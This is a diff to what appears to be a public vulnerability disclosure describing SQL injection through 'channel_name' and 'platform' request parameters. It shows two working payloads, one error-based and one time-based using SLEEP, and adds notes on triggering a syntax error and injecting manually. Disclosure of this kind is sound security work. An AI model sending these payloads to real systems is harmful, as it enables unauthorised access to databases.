@@ -68,7 +68,9 @@ Payload(This string is also applied to 'platform' at the same time):
 1.channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1
 2.channel_name=test" AND SLEEP(5)-- NklJ&platform=1
 ```
-![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_1.png)
+Input special characters ["] can cause an error in the SQL syntax:  
+![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_1.png)  
+Use manual injection：  
 ![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_2.png)
 ![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_3.png)
 ![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_4.png)
